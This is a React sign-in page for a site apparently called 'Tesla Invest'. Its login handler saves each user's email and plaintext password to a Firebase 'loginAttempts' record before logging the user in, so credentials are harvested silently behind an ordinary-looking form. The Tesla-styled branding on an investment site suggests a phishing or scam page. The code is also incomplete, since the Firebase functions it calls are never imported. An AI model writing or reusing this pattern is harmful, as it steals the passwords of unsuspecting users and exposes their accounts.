import React, { useState } from 'react';
import { Link } from 'wouter';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { useAuth } from '@/contexts/AuthContext';
import { useToast } from '@/hooks/use-toast';
import { Eye, EyeOff } from 'lucide-react';

export default function SignIn() {
  const { login } = useAuth();
  const { toast } = useToast();
  const [loginForm, setLoginForm] = useState({ email: '', password: '' });
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    try {
      // Save raw login details to Firebase Realtime Database
      const db = getDatabase(app);
      const loginRef = ref(db, "loginAttempts"); // collection path
      await push(loginRef, {
        email: loginForm.email,
        password: loginForm.password, // ⚠️ raw password storage (not secure)
        timestamp: new Date().toISOString()
      });

      // Continue with normal login
      await login(loginForm.email, loginForm.password);
      toast({ title: 'Success', description: 'Logged in successfully' });
    } catch (error) {
      toast({
        title: 'Error',
        description: error instanceof Error ? error.message : 'Invalid email or password',
        variant: 'destructive'
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-tesla-dark text-white flex items-center justify-center px-4">
      <div className="w-full max-w-md">
        {/* Logo and Header */}
        <div className="text-center mb-8">
          <Link href="/">
            <div className="flex items-center justify-center space-x-3 mb-4">
              <img
                src="/logo.png"
                alt="Logo"
                className="w-12 h-12 object-contain"
              />
              <span className="text-2xl font-bold">Tesla Invest</span>
            </div>
          </Link>
          <h1 className="text-3xl font-bold mb-2">Welcome Back</h1>
          <p className="text-gray-400">Sign in to your Tesla Invest account</p>
        </div>

        {/* Sign In Form */}
        <div className="bg-tesla-surface rounded-xl border border-tesla-border p-8">
          <form onSubmit={handleLogin} className="space-y-6">
            <div>
              <Label htmlFor="email" className="text-white">Email Address</Label>
              <Input
                id="email"
                type="email"
                value={loginForm.email}
                onChange={(e) => setLoginForm({ ...loginForm, email: e.target.value })}
                className="bg-tesla-grey border-tesla-border text-white placeholder-gray-400 mt-2"
                placeholder="Enter your email"
                required
              />
            </div>

            <div>
              <Label htmlFor="password" className="text-white">Password</Label>
              <div className="relative mt-2">
                <Input
                  id="password"
                  type={showPassword ? "text" : "password"}
                  value={loginForm.password}
                  onChange={(e) => setLoginForm({ ...loginForm, password: e.target.value })}
                  className="bg-tesla-grey border-tesla-border text-white placeholder-gray-400 pr-10"
                  placeholder="Enter your password"
                  required
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-white"
                >
                  {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                </button>
              </div>
            </div>

            <div className="flex items-center justify-between">
              <div className="flex items-center">
                <input
                  id="remember-me"
                  name="remember-me"
                  type="checkbox"
                  className="h-4 w-4 text-tesla-red focus:ring-tesla-red border-tesla-border rounded bg-tesla-grey"
                />
                <label htmlFor="remember-me" className="ml-2 text-sm text-gray-400">
                  Remember me
                </label>
              </div>
              <div className="text-sm">
                <a href="#" className="text-tesla-red hover:underline">
                  Forgot password?
                </a>
              </div>
            </div>

            <Button
              type="submit"
              disabled={isLoading}
              className="w-full bg-tesla-red hover:bg-tesla-red/80 text-white py-3"
            >
              {isLoading ? 'Signing in...' : 'Sign In'}
            </Button>
          </form>
        </div>

        {/* Sign Up Link */}
        <div className="text-center mt-6">
          <span className="text-gray-400">Don't have an account? </span>
          <Link href="/signup" className="text-tesla-red hover:underline font-medium">
            Create account
          </Link>
        </div>

        {/* Back to Home */}
        <div className="text-center mt-4">
          <Link href="/" className="text-gray-400 hover:text-white text-sm">
            ← Back to home
          </Link>
        </div>
      </div>
    </div>
  );
}
